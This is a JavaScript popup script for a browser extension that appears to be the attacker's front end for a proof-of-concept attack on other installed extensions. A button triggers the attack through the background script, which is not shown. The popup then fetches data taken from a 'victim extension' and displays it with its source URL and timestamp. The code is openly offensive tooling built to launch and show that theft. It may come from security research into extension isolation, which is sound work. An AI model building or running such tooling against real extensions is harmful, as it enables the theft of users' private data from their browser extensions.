document.getElementById("attack-btn").addEventListener("click", async () => {
  const status = document.getElementById("status");
  status.textContent = "Scanning for extension tabs...";

  browser.runtime.sendMessage({ action: "triggerAttack" }, () => {
    status.textContent = "Attack complete. Loading results...";
    loadResults();
  });
});

async function loadResults() {
  browser.runtime.sendMessage({ action: "getStolenData" }, (data) => {
    const results = document.getElementById("results");
    if (!data || data.length === 0) {
      results.innerHTML = '<p style="color:#666">No data stolen yet. Make sure the victim extension has an open tab/popup.</p>';
      return;
    }

    results.innerHTML = "";
    for (const entry of data) {
      const div = document.createElement("div");
      div.className = "stolen";
      div.innerHTML = `
        <div class="entry"><span class="label">Source:</span> <span class="value">${entry.extensionUrl || 'unknown'}</span></div>
        <div class="entry"><span class="label">Time:</span> <span class="value">${entry.timestamp || 'unknown'}</span></div>
        <div class="entry"><span class="label">Stolen Data:</span></div>
        <pre>${JSON.stringify(entry.data, null, 2)}</pre>
      `;
      results.appendChild(div);
    }
  });
}

// Auto-load on popup open
loadResults();
